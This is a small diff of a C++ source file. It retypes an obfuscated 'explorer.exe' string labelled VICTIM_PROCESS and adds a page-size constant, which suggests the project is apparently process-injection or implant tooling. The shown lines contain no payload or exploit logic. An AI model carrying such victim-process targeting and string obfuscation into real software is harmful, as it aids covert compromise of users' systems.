@@ -28,4 +28,6 @@ using Address64 = uint64_t;
 using Pid = uint32_t;
 using Tid = uint32_t;
 
-static const std::wstring_view VICTIM_PROCESS = WOBFUSCATE(L"explorer.exe");
+static const std::wstring VICTIM_PROCESS = WOBFUSCATE(L"explorer.exe");
+
+static constexpr size_t PAGE_SIZE = 0x1000;
